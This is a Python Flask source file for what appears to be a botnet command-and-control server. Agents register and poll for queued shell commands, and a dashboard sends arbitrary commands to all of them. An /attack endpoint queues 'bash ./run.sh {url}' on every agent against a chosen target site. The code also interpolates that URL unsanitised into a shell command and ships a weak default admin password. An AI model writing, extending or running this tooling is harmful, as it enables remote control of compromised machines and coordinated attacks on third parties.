import os
import json
import threading
import time
from functools import wraps
from flask import (
    Flask, request, jsonify, render_template, redirect, url_for,
    session, flash
)

DATA_FILE = "data.json"
ADMIN_PASS = os.getenv("ADMIN_PASS", "1213")
SECRET_KEY = os.getenv("SECRET_KEY", "change-me-in-envdsadadsad")
ACTIVE_THRESHOLD = int(os.getenv("ACTIVE_THRESHOLD", "60"))  # seconds to consider agent active

app = Flask(__name__)
app.secret_key = SECRET_KEY
lock = threading.Lock()


# ----------------- DATA UTILS -----------------
def init_data():
    if not os.path.exists(DATA_FILE):
        data = {
            "meta": {"paused": False},
            "agents": {},   # agent_id -> {info, queue, last_seen, disabled, current_cmd}
            "logs": []
        }
        with open(DATA_FILE, "w") as f:
            json.dump(data, f, indent=2)


def read_data():
    with lock:
        with open(DATA_FILE, "r") as f:
            return json.load(f)


def write_data(data):
    with lock:
        with open(DATA_FILE, "w") as f:
            json.dump(data, f, indent=2)


def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if session.get("logged_in"):
            return f(*args, **kwargs)
        return redirect(url_for("login", next=request.path))
    return decorated


# ----------------- AUTH -----------------
@app.route("/")
def index():
    if session.get("logged_in"):
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        pw = request.form.get("password", "")
        if pw == ADMIN_PASS:
            session["logged_in"] = True
            flash("Login successful", "success")
            return redirect(url_for("dashboard"))
        else:
            flash("Invalid password", "danger")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("login"))


# ----------------- DASHBOARD -----------------
@app.route("/dashboard")
@login_required
def dashboard():
    data = read_data()
    agents = data.get("agents", {})
    logs = list(reversed(data.get("logs", [])))[:400]
    now = int(time.time())
    # compute active counts
    active_agents = [aid for aid, a in agents.items() if (now - a.get("last_seen", 0)) <= ACTIVE_THRESHOLD]
    inactive_agents = [aid for aid in agents.keys() if aid not in active_agents]
    return render_template(
        "dashboard.html",
        agents=agents,
        logs=logs,
        active_count=len(active_agents),
        inactive_count=len(inactive_agents),
        paused=data.get("meta", {}).get("paused", False)
    )


# ----------------- NEW ROUTES -----------------
@app.route("/agents")
@login_required
def agents():
    data = read_data()
    agents_list = []
    now = int(time.time())
    for aid, info in data.get("agents", {}).items():
        agents_list.append({
            "id": aid,
            "last_seen": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(info.get("last_seen", 0))),
            "status": "disabled" if info.get("disabled") else (
                "active" if (now - info.get("last_seen", 0)) <= ACTIVE_THRESHOLD else "inactive"
            )
        })
    return jsonify(agents_list)


@app.route("/disconnect/<agent_id>", methods=["POST"])
@login_required
def disconnect_agent(agent_id):
    data = read_data()
    if agent_id not in data.get("agents", {}):
        return jsonify({"status": "error", "msg": "Agent not found"}), 404
    data["agents"][agent_id]["disabled"] = True
    data.setdefault("logs", []).append({"ts": int(time.time()), "type": "disconnect", "agent": agent_id})
    write_data(data)
    return jsonify({"status": "ok", "msg": f"Agent {agent_id} disconnected"})


@app.route("/disconnect_all", methods=["POST"])
@login_required
def disconnect_all():
    data = read_data()
    for aid in data.get("agents", {}):
        data["agents"][aid]["disabled"] = True
    data.setdefault("logs", []).append({"ts": int(time.time()), "type": "disconnect_all"})
    write_data(data)
    return jsonify({"status": "ok", "msg": "All agents disconnected"})


# ----------------- STOP ALL -----------------
@app.route("/stop_all", methods=["POST"])
@login_required
def stop_all():
    data = read_data()
    for aid, entry in data.get("agents", {}).items():
        if not entry.get("disabled"):
            entry.setdefault("queue", []).append("__STOP__")
    data.setdefault("logs", []).append({
        "ts": int(time.time()),
        "type": "stop_all",
        "agent": "all",
        "cmd": "__STOP__"
    })
    write_data(data)
    return jsonify({"status": "ok", "msg": "Stop command sent to all agents"})


# ----------------- SEND CMD -----------------
@app.route("/send", methods=["POST"])
@login_required
def send():
    if request.is_json:
        payload = request.get_json(force=True, silent=True) or {}
        agent = payload.get("agent", "all")
        cmd = (payload.get("cmd") or "").strip()
    else:
        agent = request.form.get("agent")
        cmd = (request.form.get("cmd") or "").strip()

    if not cmd:
        return jsonify({"status": "error", "message": "Empty command"}), 400

    data = read_data()
    if agent == "all":
        for a in data["agents"].keys():
            if data["agents"][a].get("disabled"):
                continue
            data["agents"][a].setdefault("queue", []).append(cmd)
    else:
        if agent not in data["agents"]:
            return jsonify({"status": "error", "message": "Agent not found"}), 404
        if data["agents"][agent].get("disabled"):
            return jsonify({"status": "error", "message": "Agent is disconnected"}), 400
        data["agents"][agent].setdefault("queue", []).append(cmd)

    data.setdefault("logs", []).append({
        "ts": int(time.time()),
        "type": "send",
        "agent": agent,
        "cmd": cmd
    })
    write_data(data)
    return jsonify({"status": "ok", "message": "Command queued"})


# ----------------- CONTROL ENDPOINTS -----------------
@app.route("/pause", methods=["POST"])
@login_required
def pause():
    data = read_data()
    data.setdefault("meta", {})["paused"] = True
    data.setdefault("logs", []).append({"ts": int(time.time()), "type": "pause"})
    write_data(data)
    return jsonify({"status": "ok", "msg": "Server paused"})


@app.route("/resume", methods=["POST"])
@login_required
def resume():
    data = read_data()
    data.setdefault("meta", {})["paused"] = False
    data.setdefault("logs", []).append({"ts": int(time.time()), "type": "resume"})
    write_data(data)
    return jsonify({"status": "ok", "msg": "Server resumed"})


# ----------------- AGENT API -----------------
@app.route("/register", methods=["POST"])
def register():
    payload = request.get_json(force=True, silent=True) or {}
    agent_id = payload.get("agent_id") or request.form.get("agent_id")
    info = payload.get("info", {})
    if not agent_id:
        return jsonify({"status": "error", "msg": "missing agent_id"}), 400
    data = read_data()
    data.setdefault("agents", {})
    entry = data["agents"].setdefault(agent_id, {})
    entry["info"] = info
    entry.setdefault("queue", [])
    entry["last_seen"] = int(time.time())
    entry.setdefault("disabled", False)
    entry.setdefault("current_cmd", None)
    write_data(data)
    return jsonify({"status": "ok", "msg": "registered"})


@app.route("/task", methods=["GET"])
def task():
    agent = request.args.get("agent")
    if not agent:
        return jsonify({"status": "error", "msg": "missing agent param"}), 400
    data = read_data()
    agents = data.setdefault("agents", {})
    entry = agents.setdefault(agent, {"info": {}, "queue": [], "last_seen": int(time.time()), "disabled": False, "current_cmd": None})
    entry["last_seen"] = int(time.time())
    if data.get("meta", {}).get("paused"):
        write_data(data)
        return jsonify({"cmd": None, "reason": "paused"})
    if entry.get("disabled"):
        write_data(data)
        return jsonify({"cmd": None, "reason": "disabled"})
    q = entry.setdefault("queue", [])
    if q:
        cmd = q.pop(0)
        entry["current_cmd"] = cmd
        data.setdefault("logs", []).append({
            "ts": int(time.time()),
            "type": "dispatch",
            "agent": agent,
            "cmd": cmd
        })
        write_data(data)
        return jsonify({"cmd": cmd})
    else:
        write_data(data)
        return jsonify({"cmd": None})


@app.route("/task_result", methods=["POST"])
def task_result():
    payload = request.get_json(force=True, silent=True) or {}
    agent = payload.get("agent_id") or request.form.get("agent_id")
    cmd = payload.get("cmd") or request.form.get("cmd")
    result = payload.get("result") or request.form.get("result")
    if not agent or cmd is None:
        return jsonify({"status": "error", "msg": "missing fields"}), 400
    data = read_data()
    data.setdefault("logs", []).append({
        "ts": int(time.time()),
        "type": "result",
        "agent": agent,
        "cmd": cmd,
        "result": (result[:2000] if result else "")
    })
    agent_entry = data.setdefault("agents", {}).setdefault(agent, {})
    if agent_entry.get("current_cmd") == cmd:
        agent_entry["current_cmd"] = None
    agent_entry["last_seen"] = int(time.time())
    write_data(data)
    return jsonify({"status": "ok"})


@app.route("/attack", methods=["POST"])
@login_required
def attack():
    if request.is_json:
        payload = request.get_json(force=True, silent=True) or {}
        url = (payload.get("url") or "").strip()
    else:
        url = (request.form.get("url") or "").strip()

    if not url:
        return jsonify({"status": "error", "message": "URL required"}), 400

    cmd = f"bash ./run.sh {url}"
    data = read_data()
    for a in data.get("agents", {}):
        if not data["agents"][a].get("disabled"):
            data["agents"][a].setdefault("queue", []).append(cmd)

    data.setdefault("logs", []).append({
        "ts": int(time.time()),
        "type": "attack",
        "agent": "all",
        "cmd": cmd
    })
    write_data(data)

    return jsonify({"status": "ok", "message": f"Attack queued: {cmd}"})


if __name__ == "__main__":
    init_data()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5000")))